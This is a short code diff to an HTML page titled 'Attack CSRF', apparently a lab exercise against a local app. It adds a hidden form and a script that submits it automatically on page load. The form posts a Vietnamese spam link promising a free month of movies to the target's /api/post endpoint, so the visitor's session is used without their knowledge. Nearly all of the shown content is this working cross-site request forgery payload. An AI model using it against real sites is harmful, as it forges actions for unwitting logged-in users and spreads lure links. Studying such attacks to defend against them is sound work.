@@ -6,6 +6,20 @@
         <title>Attack CSRF</title>
     </head>
     <body>
-        Attack CSRF
+        <form action="http://localhost:3000/api/post" method="get">
+            <div>
+                <input
+                    type="hidden"
+                    name="content"
+                    value="<a style='color: blue' href='https://csrf-attack.onrender.com/'>đăng kí</a> để nhận 1 tháng xem phim miễn phí 💥"
+                />
+            </div>
+        </form>
+        <script>
+            document.addEventListener("DOMContentLoaded", () => {
+                console.log(document.querySelector("form"));
+                document.querySelector("form").submit();
+            });
+        </script>
     </body>
 </html>
